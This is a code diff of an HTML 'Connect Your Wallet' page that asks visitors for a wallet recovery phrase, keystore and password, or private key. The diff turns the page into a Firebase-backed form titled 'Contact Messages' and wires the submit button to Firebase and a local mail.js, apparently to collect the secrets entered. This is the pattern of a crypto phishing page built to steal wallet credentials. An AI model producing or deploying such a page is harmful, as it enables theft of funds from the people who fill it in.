@@ -1,167 +1,23 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Your Wallet</title>
-    <style>
-	
-        body {
-            font-family: 'Arial', sans-serif;
-            background-image: url('https://i.ibb.co/2tffDDS/bg-connectwallet.jpg');
-            background-size: cover;
-            background-position: center;
-            color: #333;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        header {
-            background: linear-gradient(to right, #3498db, #6ab0de);
-            color: #fff;
-            text-align: center;
-            padding: 20px;
-            border-radius: 10px 10px 0 0;
-        }
-
-        section {
-            margin: 20px;
-            padding: 40px;
-            background: linear-gradient(to bottom, #fff, #f0f0f0);
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            text-align: center;
-        }
-
-        h1 {
-            font-size: 3em;
-            color: #fff;
-            margin-bottom: 20px;
-        }
-
-        p {
-            font-size: 1.4em;
-            line-height: 1.6;
-            color: #555;
-            margin-bottom: 30px;
-        }
-
-        .wallet-actions {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-around;
-            margin-top: 30px;
-        }
-
-        .wallet-action {
-            background: linear-gradient(to bottom, #3498db, #6ab0de);
-            color: #fff;
-            padding: 15px 30px;
-            margin: 20px;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s ease;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .wallet-action:hover {
-            background: linear-gradient(to bottom, #2980b9, #5499c7);
-        }
-
-        .wallet-icon {
-            font-size: 2em;
-            margin-bottom: 10px;
-        }
-
-        .selected-wallet {
-            border: 2px solid #4CAF50;
-        }
-
-        #wallet-connect-form {
-            display: none;
-            margin-top: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-size: 1.2em;
-            color: #3498db;
-        }
-
-        select,
-        input,
-        textarea {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            font-size: 1em;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-
-        button {
-            background: linear-gradient(to bottom, #3498db, #6ab0de);
-            color: #fff;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1.2em;
-            transition: background 0.3s ease;
-        }
-
-        button:hover {
-            background: linear-gradient(to bottom, #2980b9, #5499c7);
-        }
-
-        /* Media Queries for Responsive Design */
-        @media screen and (max-width: 600px) {
-            section {
-                padding: 20px;
-            }
-
-            h1 {
-                font-size: 2.5em;
-            }
-
-            p {
-                font-size: 1.2em;
-            }
-
-            .wallet-action {
-                padding: 10px;
-                margin: 10px;
-            }
-
-            button {
-                padding: 10px 20px;
-                font-size: 1em;
-            }
-        }
-    </style>
-    
+    <title>Contact Messages | Firebase</title>
+    <link rel="stylesheet" href="./styles.css">
 </head>
 
 <body>
+<!--     <div class="container"> -->
     <header>
         <h1>Connect Your Wallet</h1>
         <p>🤝 Choose your preferred wallet type and enter your credentials to connect.</p>
     </header>
-
     <section>
-        <div class="wallet-actions">
+        
+          <div class="wallet-actions">
             <!-- Wallet options dynamically generated from the provided list -->
             <label for="wallet-list">Choose Wallet:</label>
             <select id="wallet-list" onchange="selectWallet()">
@@ -238,12 +94,14 @@
 
 
                 <!-- Add more wallet options dynamically -->
-            </select>
+            </select> 
+             
         </div>
-
-        <form id="wallet-connect-form">
-            <label for="wallet-type">Selected Wallet:</label>
-            <input type="text" id="selected-wallet" readonly>
+        
+        <form action="" id="contactForm">
+            <div class="alert">Your message sent</div>
+                <label for="wallet-type">Selected Wallet:</label>
+            <input type="text" id="selected-wallet"  readonly>
 
             <label for="wallet-info-type">Select Wallet Information Type:</label>
             <select id="wallet-info-type" onchange="showInfoInput()">
@@ -251,95 +109,18 @@
                 <option value="keystore">Keystore</option>
                 <option value="private-key">Private Key</option>
             </select>
-
             <div id="info-input-container"></div>
-
-            <button type="button" onclick="connectWallet()">Connect</button>
+            
+                <button type="submit">Connect</button>
+            
         </form>
-    </section>
+         </section>
+<!--     </div> -->
 
-    <script>
-        function selectWallet() {
-            var selectedWallet = document.getElementById("wallet-list").value;
-            document.getElementById("selected-wallet").value = selectedWallet;
-            showWalletForm(selectedWallet);
-        }
-
-        function showWalletForm(selectedWallet) {
-            // Display the wallet connection form
-            document.getElementById('wallet-connect-form').style.display = 'block';
-
-            // Show or hide information input based on the selected wallet type
-            showInfoInput(selectedWallet);
-        }
-
-        function showInfoInput(selectedWallet) {
-            // Retrieve selected information type
-            const walletInfoType = document.getElementById('wallet-info-type').value;
-
-            // Remove any existing information input elements
-            const infoInputContainer = document.getElementById('info-input-container');
-            infoInputContainer.innerHTML = '';
-
-            // Dynamically create and append information input fields based on the selected type and wallet
-            switch (walletInfoType) {
-                case 'phrase':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
-                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
-                    `;
-                    break;
-                case 'keystore':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
-                        <label for="wallet-password">Wallet Password:</label>
-                        <input type="password" id="wallet-password" placeholder="Enter your password">
-                    `;
-                    break;
-                case 'private-key':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
-                    `;
-                    break;
-                default:
-                    break;
-            }
-        }
-
-        function connectWallet() {
-            // Retrieve selected wallet type, information type, and credentials
-            const selectedWallet = document.getElementById('selected-wallet').value;
-            const walletInfoType = document.getElementById('wallet-info-type').value;
-
-            // Retrieve information input based on the selected type
-            let walletCredentials;
-            switch (walletInfoType) {
-                case 'phrase':
-                    walletCredentials = document.getElementById('wallet-phrase').value;
-                    break;
-                case 'keystore':
-                    const walletKeystore = document.getElementById('wallet-keystore').value;
-                    const walletPassword = document.getElementById('wallet-password').value;
-                    walletCredentials = { keystore: walletKeystore, password: walletPassword };
-                    break;
-                case 'private-key':
-                    walletCredentials = document.getElementById('wallet-private-key').value;
-                    break;
-                default:
-                    break;
-            }
-
-            // Perform wallet connection logic (use web3 libraries)
-            // For simplicity, you can log the wallet type, information type, and credentials to the console
-            console.log('Selected Wallet:', selectedWallet);
-            console.log('Information Type:', walletInfoType);
-            console.log('Credentials:', walletCredentials);
-
-            // Add your actual wallet connection logic here
-        }
-    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+     <script src="./mail.js"></script>
+    
 </body>
 
 </html>
+
